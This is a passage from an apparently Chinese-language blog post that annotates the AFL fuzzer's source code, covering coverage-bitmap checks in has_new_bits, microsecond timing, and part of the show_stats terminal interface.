class="number">1000</span>] = <span class="number">0xFE</span>; <span class="comment">// 11111110 - 覆盖了&quot;执行1次&quot;的情况</span></span><br><span class="line">virgin_bits[<span class="number">1000</span>] = <span class="number">0xFC</span>; <span class="comment">// 11111100 - 覆盖了&quot;执行1-2次&quot;的情况</span></span><br><span class="line">virgin_bits[<span class="number">1000</span>] = <span class="number">0x00</span>; <span class="comment">// 00000000 - 各种执行次数都覆盖过了</span></span><br></pre></td></tr></table></figure><p><strong>在 trace_bits 中：字节的值 = 执行次数</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原始执行次数 → trace_bits 中的值</span></span><br><span class="line">执行<span class="number">0</span>次  → trace_bits[i] = <span class="number">0</span></span><br><span class="line">执行<span class="number">1</span>次  → trace_bits[i] = <span class="number">1</span></span><br><span class="line">执行<span class="number">2</span>次  → trace_bits[i] = <span class="number">2</span></span><br><span class="line">执行<span class="number">3</span>次  → trace_bits[i] = <span class="number">4</span></span><br><span class="line">执行<span class="number">5</span>次  → trace_bits[i] = <span class="number">8</span>   <span class="comment">// 4-7都映射到8</span></span><br><span class="line">执行<span class="number">10</span>次 → trace_bits[i] = <span class="number">16</span>  <span class="comment">// 8-15都映射到16</span></span><br><span class="line">执行<span class="number">25</span>次 → trace_bits[i] = <span class="number">32</span>  <span class="comment">// 16-31都映射到32</span></span><br><span class="line">执行<span class="number">100</span>次→ trace_bits[i] = <span class="number">64</span>  <span class="comment">// 32-127都映射到64</span></span><br><span class="line">执行<span class="number">200</span>次→ trace_bits[i] = <span class="number">128</span> <span class="comment">// 128+都映射到128</span></span><br></pre></td></tr></table></figure><p>AFL 判断是否发现新代码覆盖使用了<strong>两级检查机制</strong></p><p><strong>第一级检查：快速粗粒度检查</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(*current) &amp;&amp; unlikely(*current &amp; *virgin))</span><br></pre></td></tr></table></figure><p>这里用<strong>字（word）级别</strong>操作（32位或64位）：</p><ul><li><code>*current</code> 非零：当前执行覆盖了某些边</li><li><code>*current &amp; *virgin</code> 非零：这些边中有一些是新的</li></ul><p><strong>第二级检查：精确分类</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) || ...)</span><br></pre></td></tr></table></figure><p>进入<strong>字节级别</strong>检查，区分两种情况：</p><ul><li><code>ret = 2</code>：发现<strong>完全全新</strong>的代码区域</li><li><code>ret = 1</code>：发现新覆盖，但不是完全全新</li></ul><p>这里和之前不一样的地方就在于vir[0] == 0xff，也就是之前完全没有找到这条边</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 检测是否有新的代码路径被覆盖</span></span><br><span class="line"><span class="comment">// 参数: virgin_map - 未被覆盖的路径位图</span></span><br><span class="line"><span class="comment">// 返回值: 0=没有新路径, 1=有新路径但不是新分支, 2=发现全新的分支</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> u8 <span class="title">has_new_bits</span><span class="params">(u8 *virgin_map)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line">  <span class="comment">// 64位系统：一次处理8字节，提高效率</span></span><br><span class="line">  u64 *current = (u64 *)trace_bits;  <span class="comment">// 当前执行的路径覆盖情况</span></span><br><span class="line">  u64 *virgin = (u64 *)virgin_map;   <span class="comment">// 未被覆盖的路径位图</span></span><br><span class="line">  u32 i = (MAP_SIZE &gt;&gt; <span class="number">3</span>);           <span class="comment">// MAP_SIZE/8，因为每次处理8字节</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="comment">// 32位系统：一次处理4字节</span></span><br><span class="line">  u32 *current = (u32 *)trace_bits;  <span class="comment">// 当前执行的路径覆盖情况</span></span><br><span class="line">  u32 *virgin = (u32 *)virgin_map;   <span class="comment">// 未被覆盖的路径位图</span></span><br><span class="line">  u32 i = (MAP_SIZE &gt;&gt; <span class="number">2</span>);           <span class="comment">// MAP_SIZE/4，因为每次处理4字节</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line"></span><br><span class="line">  u8 ret = <span class="number">0</span>;  <span class="comment">// 返回值：0=无新覆盖, 1=有新覆盖, 2=全新分支</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历整个位图，比较当前执行和virgin位图</span></span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 优化：大部分情况下 (*current &amp; *virgin) == 0</span></span><br><span class="line"><span class="comment">       即当前位图中的所有位都已经在virgin map中被清除了</span></span><br><span class="line"><span class="comment">       这是最常见的情况，所以用unlikely优化分支预测 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果current有值 且 current和virgin有交集（说明有新路径）</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*current) &amp;&amp; unlikely(*current &amp; *virgin)) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 如果还没确定是否是全新分支（ret &lt; 2）</span></span><br><span class="line">      <span class="keyword">if</span> (likely(ret &lt; <span class="number">2</span>)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 转换为字节指针，进行更细粒度的检查</span></span><br><span class="line">        u8 *cur = (u8 *)current;</span><br><span class="line">        u8 *vir = (u8 *)virgin;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 检查是否发现了全新的字节（之前完全没被覆盖过的路径）</span></span><br><span class="line"><span class="comment">           如果current[]中某个非零字节对应的virgin[]字节是0xff（全1），</span></span><br><span class="line"><span class="comment">           说明这是一个全新的分支 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line">        <span class="comment">// 64位系统：检查8个字节</span></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) ||  <span class="comment">// 第1个字节是全新的？</span></span><br><span class="line">            (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||  <span class="comment">// 第2个字节是全新的？</span></span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) ||  <span class="comment">// 第3个字节是全新的？</span></span><br><span class="line">            (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>) ||  <span class="comment">// 第4个字节是全新的？</span></span><br><span class="line">            (cur[<span class="number">4</span>] &amp;&amp; vir[<span class="number">4</span>] == <span class="number">0xff</span>) ||  <span class="comment">// 第5个字节是全新的？</span></span><br><span class="line">            (cur[<span class="number">5</span>] &amp;&amp; vir[<span class="number">5</span>] == <span class="number">0xff</span>) ||  <span class="comment">// 第6个字节是全新的？</span></span><br><span class="line">            (cur[<span class="number">6</span>] &amp;&amp; vir[<span class="number">6</span>] == <span class="number">0xff</span>) ||  <span class="comment">// 第7个字节是全新的？</span></span><br><span class="line">            (cur[<span class="number">7</span>] &amp;&amp; vir[<span class="number">7</span>] == <span class="number">0xff</span>))    <span class="comment">// 第8个字节是全新的？</span></span><br><span class="line">          ret = <span class="number">2</span>;  <span class="comment">// 发现全新分支</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          ret = <span class="number">1</span>;  <span class="comment">// 有新覆盖，但不是全新分支</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        <span class="comment">// 32位系统：检查4个字节</span></span><br><span class="line">        <span class="keyword">if</span> ((cur[<span class="number">0</span>] &amp;&amp; vir[<span class="number">0</span>] == <span class="number">0xff</span>) ||  <span class="comment">// 第1个字节是全新的？</span></span><br><span class="line">            (cur[<span class="number">1</span>] &amp;&amp; vir[<span class="number">1</span>] == <span class="number">0xff</span>) ||  <span class="comment">// 第2个字节是全新的？</span></span><br><span class="line">            (cur[<span class="number">2</span>] &amp;&amp; vir[<span class="number">2</span>] == <span class="number">0xff</span>) ||  <span class="comment">// 第3个字节是全新的？</span></span><br><span class="line">            (cur[<span class="number">3</span>] &amp;&amp; vir[<span class="number">3</span>] == <span class="number">0xff</span>))    <span class="comment">// 第4个字节是全新的？</span></span><br><span class="line">          ret = <span class="number">2</span>;  <span class="comment">// 发现全新分支</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          ret = <span class="number">1</span>;  <span class="comment">// 有新覆盖，但不是全新分支</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^WORD_SIZE_64 */</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 更新virgin位图：清除已经被覆盖的位</span></span><br><span class="line">      <span class="comment">// *virgin = *virgin &amp; ~*current</span></span><br><span class="line">      <span class="comment">// 这样下次相同的路径就不会被认为是&quot;新&quot;的了</span></span><br><span class="line">      *virgin &amp;= ~*current;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 移动到下一个字/双字</span></span><br><span class="line">    current++;</span><br><span class="line">    virgin++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果发现新路径，且操作的是全局virgin_bits位图，标记位图已改变</span></span><br><span class="line">  <span class="keyword">if</span> (ret &amp;&amp; virgin_map == virgin_bits)</span><br><span class="line">    bitmap_changed = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>，然后开始计时</p><h4 id="get-cur-time-us"><a href="#get-cur-time-us" class="headerlink" title="get_cur_time_us"></a>get_cur_time_us</h4><p>获取当前时间戳</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u64 <span class="title">get_cur_time_us</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* timeval 结构体用于存储时间值</span></span><br><span class="line"><span class="comment">   * 包含两个成员：</span></span><br><span class="line"><span class="comment">   * - tv_sec：秒数（自1970年以来）</span></span><br><span class="line"><span class="comment">   * - tv_usec：微秒数（当前秒内的微秒部分，范围 0-999999）</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* timezone 结构体用于存储时区信息</span></span><br><span class="line"><span class="comment">   * 虽然在这里声明了，但 AFL 实际上不使用时区信息</span></span><br><span class="line"><span class="comment">   * 现代代码中通常传 NULL 给 gettimeofday 的第二个参数</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 获取当前时间</span></span><br><span class="line"><span class="comment">   * gettimeofday() 是 POSIX 标准函数，获取高精度时间</span></span><br><span class="line"><span class="comment">   * 第一个参数：存储时间值的 timeval 结构体指针</span></span><br><span class="line"><span class="comment">   * 第二个参数：时区信息（这里虽然传了 &amp;tz，但实际不使用）</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  gettimeofday(&amp;tv, &amp;tz);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 计算总微秒数</span></span><br><span class="line"><span class="comment">   * tv.tv_sec * 1000000ULL：将秒转换为微秒（1秒 = 1,000,000微秒）</span></span><br><span class="line"><span class="comment">   * ULL 后缀：确保使用 unsigned long long 类型，避免整数溢出</span></span><br><span class="line"><span class="comment">   * + tv.tv_usec：加上微秒部分</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 示例：如果 tv_sec=1704110400, tv_usec=123456</span></span><br><span class="line"><span class="comment">   * 返回：1704110400 * 1000000 + 123456 = 1704110400123456 微秒</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">return</span> (tv.tv_sec * <span class="number">1000000ULL</span>) + tv.tv_usec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是showstate</p><h4 id="show-stats"><a href="#show-stats" class="headerlink" title="show_stats"></a>show_stats</h4><p>这里我不详细讨论整个函数的功能，只大概给一个注释，如果日后需要学习我会在这里补充，主要是这个函数太复杂了，现在看来没有太多可以学习的地方</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">show_stats</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 静态变量用于保存上次更新的时间和执行次数 */</span></span><br><span class="line">  <span class="keyword">static</span> u64 last_stats_ms, last_plot_ms, last_ms, last_execs;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">double</span> avg_exec;  <span class="comment">/* 平均执行速度 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">double</span> t_byte_ratio, stab_ratio;  <span class="comment">/* 覆盖率和稳定性比率 */</span></span><br><span class="line"></span><br><span class="line">  u64 cur_ms;  <span class="comment">/* 当前时间（毫秒） */</span></span><br><span class="line">  u32 t_bytes, t_bits;  <span class="comment">/* 覆盖的字节数和位数 */</span></span><br><span class="line"></span><br><span class="line">  u32 banner_len, banner_pad;  <span class="comment">/* 横幅长度和填充 */</span></span><br><span class="line">  u8 tmp[<span class="number">256</span>];  <span class="comment">/* 临时缓冲区 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取当前时间 */</span></span><br><span class="line">  cur_ms = get_cur_time();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果距离上次UI更新时间太短，直接返回，避免频繁刷新 */</span></span><br><span class="line">  <span class="keyword">if</span> (cur_ms - last_ms &lt; <span class="number">1000</span> / UI_TARGET_HZ)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检查是否已运行超过10分钟 */</span></span><br><span class="line">  <span class="keyword">if</span> (cur_ms - start_time &gt; <span class="number">10</span> * <span class="number">60</span> * <span class="number">1000</span>)</span><br><span class="line">    run_over10m = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 计算平滑后的执行速度统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (!last_execs) &#123;</span><br><span class="line">    <span class="comment">/* 首次计算：使用总体平均值 */</span></span><br><span class="line">    avg_exec = ((<span class="keyword">double</span>)total_execs) * <span class="number">1000</span> / (cur_ms - start_time);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 计算当前平均速度 */</span></span><br><span class="line">    <span class="keyword">double</span> cur_avg =</span><br><span class="line">        ((<span class="keyword">double</span>)(total_execs - last_execs)) * <span class="number">1000</span> / (cur_ms - last_ms);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果速度发生剧烈变化（5倍以上），快速重置指标 */</span></span><br><span class="line">    <span class="keyword">if</span> (cur_avg * <span class="number">5</span> &lt; avg_exec || cur_avg / <span class="number">5</span> &gt; avg_exec)</span><br><span class="line">      avg_exec = cur_avg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 使用指数移动平均法平滑速度值 */</span></span><br><span class="line">    avg_exec = avg_exec * (<span class="number">1.0</span> - <span class="number">1.0</span> / AVG_SMOOTHING) +</span><br><span class="line">               cur_avg * (<span class="number">1.0</span> / AVG_SMOOTHING);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  last_ms = cur_ms;</span><br><span class="line">  last_execs = total_execs;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 告诉调用者何时联系我们（以执行次数为单位） */</span></span><br><span class="line">  stats_update_freq = avg_exec / (UI_TARGET_HZ * <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> (!stats_update_freq)</span><br><span class="line">    stats_update_freq = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 进行位图统计 */</span></span><br><span class="line">  t_bytes = count_non_255_bytes(virgin_bits);  <span class="comment">/* 计算已覆盖的字节数 */</span></span><br><span class="line">  t_byte_ratio = ((<span class="keyword">double</span>)t_bytes * <span class="number">100</span>) / MAP_SIZE;  <span class="comment">/* 覆盖率百分比 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 计算稳定性比率 */</span></span><br><span class="line">  <span class="keyword">if</span> (t_bytes)</span><br><span class="line">    stab_ratio = <span class="number">100</span> - ((<span class="keyword">double</span>)var_byte_count) * <span class="number">100</span> / t_bytes;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    stab_ratio = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 大约每分钟更新fuzzer统计信息并保存自动令牌 */</span></span><br><span class="line">  <span class="keyword">if</span> (cur_ms - last_stats_ms &gt; STATS_UPDATE_SEC * <span class="number">1000</span>) &#123;</span><br><span class="line"></span><br><span class="line">    last_stats_ms = cur_ms;</span><br><span class="line">    write_stats_file(t_byte_ratio, stab_ratio, avg_exec);  <span class="comment">/* 写入统计文件 */</span></span><br><span class="line">    save_auto();  <span class="comment">/* 保存自动生成的测试用例 */</span></span><br><span class="line">    write_bitmap();  <span class="comment">/* 保存覆盖位图 */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 定期写入绘图数据 */</span></span><br><span class="line">  <span class="keyword">if</span> (cur_ms - last_plot_ms &gt; PLOT_UPDATE_SEC * <span class="number">1000</span>) &#123;</span><br><span class="line"></span><br><span class="line">    last_plot_ms = cur_ms;</span><br><span class="line">    maybe_update_plot_file(t_byte_ratio, avg_exec);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 处理AFL_EXIT_WHEN_DONE环境变量：完成后自动退出 */</span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; cycles_wo_finds &gt; <span class="number">100</span> &amp;&amp; !pending_not_fuzzed &amp;&amp;</span><br><span class="line">      getenv(<span class="string">&quot;AFL_EXIT_WHEN_DONE&quot;</span>))</span><br><span class="line">    stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 处理AFL_BENCH_UNTIL_CRASH环境变量：遇到崩溃后停止 */</span></span><br><span class="line">  <span class="keyword">if</span> (total_crashes &amp;&amp; getenv(<span class="string">&quot;AFL_BENCH_UNTIL_CRASH&quot;</span>))</span><br><span class="line">    stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果不在TTY终端上，直接返回 */</span></span><br><span class="line">  <span class="keyword">if</span> (not_on_tty)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 计算一些有用的位图统计信息 */</span></span><br><span class="line">  t_bits = (MAP_SIZE &lt;&lt; <span class="number">3</span>) - count_bits(virgin_bits);  <span class="comment">/* 已覆盖的位数 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 现在开始绘制可视化界面... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clear_screen) &#123;</span><br><span class="line">    <span class="comment">/* 清屏并隐藏光标 */</span></span><br><span class="line">    SAYF(TERM_CLEAR CURSOR_HIDE);</span><br><span class="line">    clear_screen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    check_term_size();  <span class="comment">/* 检查终端大小 */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 光标移到起始位置 */</span></span><br><span class="line">  SAYF(TERM_HOME);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 终端太小时的处理 */</span></span><br><span class="line">  <span class="keyword">if</span> (term_too_small) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cBRI <span class="string">&quot;Your terminal is too small to display the UI.\n&quot;</span></span><br><span class="line">              <span class="string">&quot;Please resize terminal window to at least 80x25.\n&quot;</span> cRST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 绘制居中的横幅 */</span></span><br><span class="line">  banner_len = (crash_mode ? <span class="number">24</span> : <span class="number">22</span>) + <span class="built_in">strlen</span>(VERSION) + <span class="built_in">strlen</span>(use_banner);</span><br><span class="line">  banner_pad = (<span class="number">80</span> - banner_len) / <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">memset</span>(tmp, <span class="string">&#x27; &#x27;</span>, banner_pad);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp + banner_pad, <span class="string">&quot;%s &quot;</span> cLCY VERSION cLGN <span class="string">&quot; (%s)&quot;</span>,</span><br><span class="line">          crash_mode ? cPIN <span class="string">&quot;peruvian were-rabbit&quot;</span> : cYEL <span class="string">&quot;american fuzzy lop&quot;</span>,</span><br><span class="line">          use_banner);</span><br><span class="line"></span><br><span class="line">  SAYF(<span class="string">&quot;\n%s\n\n&quot;</span>, tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 定义绘制框的快捷方式宏 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bSTG bSTART cGRA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bH2 bH bH</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bH5 bH2 bH2 bH</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bH10 bH5 bH5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bH20 bH10 bH10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bH30 bH20 bH10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SP5 <span class="meta-string">&quot;     &quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SP10 SP5 SP5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SP20 SP10 SP10</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 绘制UI界面 ========== */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 第一行：进程时间和总体结果标题 */</span></span><br><span class="line">  SAYF(SET_G1 bSTG bLT bH bSTOP cCYA</span><br><span class="line">       <span class="string">&quot; process timing &quot;</span> bSTG bH30 bH5 bH2 bHB bH bSTOP cCYA</span><br><span class="line">       <span class="string">&quot; overall results &quot;</span> bSTG bH5 bRT <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 根据fuzzing状态设置颜色 */</span></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode) &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(tmp, cRST);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    u64 min_wo_finds = (cur_ms - last_path_time) / <span class="number">1000</span> / <span class="number">60</span>;  <span class="comment">/* 未发现新路径的分钟数 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 第一轮队列循环：不要停止！显示为洋红色 */</span></span><br><span class="line">    <span class="keyword">if</span> (queue_cycle == <span class="number">1</span> || min_wo_finds &lt; <span class="number">15</span>)</span><br><span class="line">      <span class="built_in">strcpy</span>(tmp, cMGN);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment">/* 后续循环，但仍在发现新路径，显示为黄色 */</span></span><br><span class="line">      <span class="keyword">if</span> (cycles_wo_finds &lt; <span class="number">25</span> || min_wo_finds &lt; <span class="number">30</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(tmp, cYEL);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="comment">/* 长时间未发现新路径且无待测试用例，显示为浅绿色 */</span></span><br><span class="line">        <span class="keyword">if</span> (cycles_wo_finds &gt; <span class="number">100</span> &amp;&amp; !pending_not_fuzzed &amp;&amp; min_wo_finds &gt; <span class="number">120</span>)</span><br><span class="line">          <span class="built_in">strcpy</span>(tmp, cLGN);</span><br><span class="line">        <span class="comment">/* 默认：谨慎地可以停止？显示为浅蓝色 */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">strcpy</span>(tmp, cLBL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 运行时间和循环次数 */</span></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot;        run time : &quot;</span> cRST <span class="string">&quot;%-34s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                <span class="string">&quot;  cycles done : %s%-5s  &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       DTD(cur_ms, start_time), tmp, DI(queue_cycle - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 最后发现新路径的时间 */</span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode &amp;&amp; (last_path_time || resuming_fuzz || queue_cycle == <span class="number">1</span> ||</span><br><span class="line">                     in_bitmap || crash_mode)) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(bV bSTOP <span class="string">&quot;   last new path : &quot;</span> cRST <span class="string">&quot;%-34s &quot;</span>,</span><br><span class="line">         DTD(cur_ms, last_path_time));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dumb_mode)</span><br><span class="line">      SAYF(bV bSTOP <span class="string">&quot;   last new path : &quot;</span> cPIN <span class="string">&quot;n/a&quot;</span> cRST</span><br><span class="line">                    <span class="string">&quot; (non-instrumented mode)        &quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      SAYF(bV bSTOP <span class="string">&quot;   last new path : &quot;</span> cRST <span class="string">&quot;none yet &quot;</span> cLRD</span><br><span class="line">                    <span class="string">&quot;(odd, check syntax!)      &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 总路径数 */</span></span><br><span class="line">  SAYF(bSTG bV bSTOP <span class="string">&quot;  total paths : &quot;</span> cRST <span class="string">&quot;%-5s  &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       DI(queued_paths));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 崩溃统计（超过限制时用红色高亮并添加+号） */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s%s&quot;</span>, DI(unique_crashes),</span><br><span class="line">          (unique_crashes &gt;= KEEP_UNIQUE_CRASH) ? <span class="string">&quot;+&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot; last uniq crash : &quot;</span> cRST <span class="string">&quot;%-34s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                <span class="string">&quot; uniq crashes : %s%-6s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       DTD(cur_ms, last_crash_time), unique_crashes ? cLRD : cRST, tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 挂起统计 */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s%s&quot;</span>, DI(unique_hangs),</span><br><span class="line">          (unique_hangs &gt;= KEEP_UNIQUE_HANG) ? <span class="string">&quot;+&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot;  last uniq hang : &quot;</span> cRST <span class="string">&quot;%-34s &quot;</span> bSTG bV bSTOP</span><br><span class="line">                <span class="string">&quot;   uniq hangs : &quot;</span> cRST <span class="string">&quot;%-6s &quot;</span> bSTG bV <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">       DTD(cur_ms, last_hang_time), tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 循环进度和映射覆盖率标题 */</span></span><br><span class="line">  SAYF(bVR bH bSTOP cCYA <span class="string">&quot; cycle progress &quot;</span> bSTG bH20 bHB bH bSTOP cCYA</span><br><span class="line">                         <span class="string">&quot; map coverage &quot;</span> bSTG bH bHT bH20 bH2 bH bVL <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 当前处理的测试用例 */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s%s (%0.02f%%)&quot;</span>, DI(current_entry),</span><br><span class="line">          queue_cur-&gt;favored ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;*&quot;</span>,  <span class="comment">/* 非优先路径用*标记 */</span></span><br><span class="line">          ((<span class="keyword">double</span>)current_entry * <span class="number">100</span>) / queued_paths);</span><br><span class="line"></span><br><span class="line">  SAYF(bV bSTOP <span class="string">&quot;  now processing : &quot;</span> cRST <span class="string">&quot;%-17s &quot;</span> bSTG bV bSTOP, tmp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 映射密度 */</span></span><br><span class="line">  <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%0.02f%% / %0.02f%%&quot;</span>,</span><br><span class="line">          ((<span class="keyword">double</span>)queue_cur-&gt;bitmap_size) * <span class="number">100</span> / MAP_SIZE, t_byte_ratio);</span><br><span class="line"></span><br><span class="line">  SAYF(<span 